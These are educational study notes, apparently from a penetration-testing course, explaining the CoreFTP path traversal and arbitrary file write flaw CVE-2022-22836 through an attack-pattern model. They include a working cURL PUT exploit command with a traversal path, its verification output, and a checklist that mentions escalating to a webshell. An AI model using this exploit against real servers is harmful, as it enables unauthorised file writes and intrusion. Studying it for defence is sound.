Latest FTP Vulnerabilities: Study Notes
Core idea

This section walks through a real CVE to show the Concept of Attacks pattern (Source → Process → Privileges → Destination) applied to a specific, current vulnerability — kept simple on purpose, light on deep technical detail.
The vulnerability: CoreFTP before build 727 — CVE-2022-22836

    Affects CoreFTP FTP service
    Root cause: the service doesn't correctly process the HTTP PUT request
    Leads to two chained issues:
        Authenticated directory/path traversal
        Arbitrary file write
    Net effect: you can write files outside the directory the service is supposed to be restricted to

Why it works

CoreFTP normally uses HTTP POST for uploads, but it also accepts HTTP PUT, which lets you write arbitrary content to a file path of your choosing.
The exploit (single cURL command)

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops

Part 	Purpose
-X PUT 	Sends a raw HTTP PUT request
--basic -u <username>:<password> 	Basic authentication (you need valid creds — this is an authenticated vuln)
--path-as-is https://<IP>/../../../../../../whoops 	The traversal path — escapes the restricted folder and names the target file whoops
--data-binary "PoC." 	The content to write into the file
-H "Host: <IP>" 	Sets the Host header to the target IP
-k 	Ignores TLS certificate errors
Mapped to the Concept of Attacks (two chained loops)
Loop 1: Directory Traversal
# 	What happens 	Category
1 	User crafts the HTTP request type + file content + path, using ../../ to escape the restricted area 	Source
2 	The altered request (type, content, path) is picked up and processed 	Process
3 	App checks authorization for the path — but since restrictions only cover one folder, traversal bypasses them entirely 	Privileges
4 	Destination is a second process, tasked with writing the user's content to the local system 	Destination
Loop 2: Arbitrary File Write
# 	What happens 	Category
5 	Same user input now acts as the new Source: filename (whoops) + content ("PoC.") 	Source
6 	Process writes the specified content to the specified file 	Process
7 	Because traversal already bypassed all restrictions, the service approves the write 	Privileges
8 	The file whoops, now containing "PoC.", is the final Destination on the local system 	Destination

Pattern recap: just like Log4j, the Destination of the first loop (bypassed restricted folder) feeds directly into the Source of the second loop (the write operation itself).
Verifying the result

On the target system:

C:\> type C:\whoops

PoC.

Confirms the file was written outside the intended directory with attacker-controlled content.
Pentester's quick checklist

    Identify the FTP service and version — check if it's CoreFTP pre-build 727
    Confirm you have (or can obtain) valid credentials — this exploit is authenticated
    Test if the service's HTTP interface accepts PUT in addition to POST
    Try a traversal payload (../../../../) in the path to see if it escapes the restricted folder
    Write a harmless test file first (like the whoops PoC) to confirm write access before attempting anything more impactful
    Consider what a real payload in that written file could achieve depending on where it lands (e.g., web root → RCE via webshell)

One-line summary

    CoreFTP's HTTP PUT support wasn't restricted to the same sandboxed folder as uploads — so directory traversal in the path lets an authenticated user write arbitrary files anywhere the service can reach.
